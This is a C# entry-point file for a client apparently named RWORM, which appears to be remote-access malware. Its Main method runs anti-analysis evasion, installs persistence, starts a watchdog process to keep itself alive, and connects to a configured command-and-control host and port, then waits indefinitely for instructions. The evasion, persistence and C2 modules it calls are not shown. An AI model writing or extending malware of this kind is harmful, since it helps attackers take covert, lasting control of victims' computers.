using System;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;
using RWORM.Client.Modules;
using RWORM.Client.Network;

namespace RWORM.Client
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            
            if (args.Length >= 3 && (args[0] == "--watchdog" || args[0] == "--supervisor"))
            {
                Watchdog.RunWatchdogMode(args);
                return;
            }

            
            Evasion.Run();

            
            Persistence.Install();

            
            Watchdog.InitializeWatchdog();

            
            var connector = new Connector();

            
            using var exitEvent = new ManualResetEventSlim(false);

            connector.ConnectAsync(Config.C2Host, Config.C2Port)
                     .ContinueWith(t =>
                     {
                         
                     });

            exitEvent.Wait(); 
        }
    }
}
